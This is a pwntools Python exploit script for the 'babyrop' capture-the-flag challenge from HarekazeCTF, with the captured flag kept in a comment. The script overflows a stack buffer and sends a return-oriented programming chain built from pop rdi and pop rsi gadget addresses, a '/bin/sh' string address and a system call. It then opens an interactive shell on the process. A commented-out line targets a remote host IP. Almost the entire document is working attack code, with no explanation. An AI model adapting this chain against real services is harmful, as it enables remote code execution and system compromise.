from pwn import *
context.terminal = ['tmux','split','-h']
#flag =HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}

#p=remote("133.242.238.121",20001)
elf=ELF('./babyrop')

p=process('./babyrop')
gdb.attach(proc.pidof(p)[0])

p.recvuntil('?')

pop_rdi_addr=p64(0x400683)
pop_rsi_r15 = p64(0x0000000000400681)

system=p64(0x4006ab)

binsh_addr=p64(0x601048)
#binsh_addr=p64(0x400286)

payload='A'*24
payload+=pop_rdi_addr
payload+=binsh_addr
payload+=pop_rsi_r15
payload+=p64(0x00000000004005d6)
payload+=p64(0)
payload+=system

p.sendline(payload)
p.interactive()
